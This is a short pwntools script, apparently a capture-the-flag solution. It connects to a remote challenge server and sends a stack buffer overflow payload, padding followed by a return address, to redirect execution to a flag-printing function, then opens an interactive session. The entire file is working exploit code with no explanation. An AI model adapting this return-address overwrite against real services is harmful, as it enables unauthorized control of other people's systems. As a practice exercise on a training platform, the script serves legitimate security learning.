from pwn import *

r = remote('node5.buuoj.cn', 29044)
context.log_level = 'debug'

cat_flag_addr = 0x401157
payload = b'A' * 0x118 + p64(cat_flag_addr)
r.sendline(payload)
r.interactive()
